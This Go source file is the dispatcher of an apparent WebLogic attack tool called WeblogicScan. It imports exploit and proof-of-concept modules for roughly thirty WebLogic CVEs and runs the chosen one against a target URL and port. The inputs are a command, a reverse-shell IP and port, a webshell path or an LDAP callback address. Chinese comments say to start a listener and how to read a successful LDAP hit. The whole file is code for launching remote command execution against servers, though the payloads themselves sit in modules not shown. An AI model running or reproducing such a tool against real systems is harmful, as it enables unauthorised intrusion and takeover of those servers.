package utils

import (
	"WeblogicScan/EXP/CVE_2016_0638Exp"
	"WeblogicScan/EXP/CVE_2016_3510Exp"
	"WeblogicScan/EXP/CVE_2017_3248Exp"
	"WeblogicScan/EXP/CVE_2018_2628Exp"
	"WeblogicScan/EXP/CVE_2018_2893Exp"
	"WeblogicScan/EXP/CVE_2020_14882Exp"
	"WeblogicScan/EXP/cve_2020_2555Exp"
	"WeblogicScan/EXP/cve_2020_2883Exp"
	"WeblogicScan/poc/CVE_2014_4210"
	"WeblogicScan/poc/CVE_2016_0638"
	"WeblogicScan/poc/CVE_2016_3510"
	"WeblogicScan/poc/CVE_2017_10271"
	"WeblogicScan/poc/CVE_2017_3248"
	"WeblogicScan/poc/CVE_2017_3506"
	"WeblogicScan/poc/CVE_2018_2628"
	"WeblogicScan/poc/CVE_2018_2893"
	"WeblogicScan/poc/CVE_2018_2894"
	"WeblogicScan/poc/CVE_2019_2725"
	"WeblogicScan/poc/CVE_2019_2729"
	"WeblogicScan/poc/CVE_2019_2890"
	"WeblogicScan/poc/Console"
	"WeblogicScan/poc/cve_2018_3191"
	"WeblogicScan/poc/cve_2018_3245"
	"WeblogicScan/poc/cve_2018_3252"
	"WeblogicScan/poc/cve_2020_14750"
	"WeblogicScan/poc/cve_2020_14882"
	"WeblogicScan/poc/cve_2020_14883"
	"WeblogicScan/poc/cve_2020_2551"
	"WeblogicScan/poc/cve_2020_2555"
	"WeblogicScan/poc/cve_2020_2883"
	"WeblogicScan/poc/cve_2023_21839"
	"fmt"
)

type WorkExp struct {
	Url   string
	Port  string
	Rip   string
	Rport string
	EXP   string
	Cmd   string
	Ldap  string
}

func (c *WorkExp) WeblogicScanRun() {

	switch c.EXP {
	case "0638":
		CVE_2016_0638Exp.Run(c.Url, c.Port, c.Cmd)
		return
	case "3510":
		CVE_2016_3510Exp.Run(c.Url, c.Port, c.Cmd)
		return
	case "3248":
		CVE_2017_3248Exp.Run(c.Url, c.Port, c.Cmd)
		return
	case "2628":
		CVE_2018_2628Exp.Run(c.Url, c.Port, c.Cmd) // 此处的CMD为 WebShell 路径
		return
	case "2893":
		CVE_2018_2893Exp.Run(c.Url, c.Port, c.Rip, c.Rport) // 要开监听
		return
	case "14882":
		CVE_2020_14882Exp.Run(c.Url, c.Port, c.Cmd)
		return
	case "2555":
		cve_2020_2555Exp.Run(c.Url, c.Port, c.Cmd)
		return
	case "2883":
		cve_2020_2883Exp.Run(c.Url, c.Port, c.Cmd)
		return
	case "21839":
		cve_2023_21839.Run(c.Url, c.Port, c.Ldap)
		return
	default:
		fmt.Println("The entered EXP does not exist")
	}

	Console.Run(c.Url, c.Port)
	CVE_2014_4210.Run(c.Url, c.Port)

	CVE_2016_0638.Run(c.Url, c.Port)
	CVE_2016_3510.Run(c.Url, c.Port)

	CVE_2017_10271.Run(c.Url, c.Port)
	CVE_2017_3248.Run(c.Url, c.Port)
	CVE_2017_3506.Run(c.Url, c.Port)

	CVE_2018_2628.Run(c.Url, c.Port)
	CVE_2018_2893.Run(c.Url, c.Port)
	CVE_2018_2894.Run(c.Url, c.Port)
	cve_2018_3191.Run(c.Url, c.Port)
	cve_2018_3245.Run(c.Url, c.Port)
	cve_2018_3252.Run(c.Url, c.Port)

	CVE_2019_2725.Run(c.Url, c.Port)
	CVE_2019_2729.Run(c.Url, c.Port)
	CVE_2019_2890.Run(c.Url, c.Port)

	cve_2020_2551.Run(c.Url, c.Port)
	cve_2020_2555.Run(c.Url, c.Port, c.Cmd)
	cve_2020_2883.Run(c.Url, c.Port, c.Cmd)
	cve_2020_14750.Run(c.Url, c.Port)
	cve_2020_14882.Run(c.Url, c.Port)
	cve_2020_14883.Run(c.Url, c.Port)

	// 报错说明不存在，不报错且ldap服务有反应说明利用成功
	cve_2023_21839.Run(c.Url, c.Port, c.Ldap)
}
